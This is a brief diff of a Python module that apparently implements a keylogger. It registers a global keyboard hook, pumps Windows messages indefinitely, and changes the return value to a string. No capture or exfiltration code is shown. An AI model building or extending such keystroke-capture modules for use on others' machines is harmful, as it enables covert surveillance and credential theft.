@@ -72,4 +72,4 @@ def run(**args):
     
     # register the hook and execute forever
     kl.HookKeyboard()
-    return pythoncom.PumpMessages()
+    return str(pythoncom.PumpMessages())
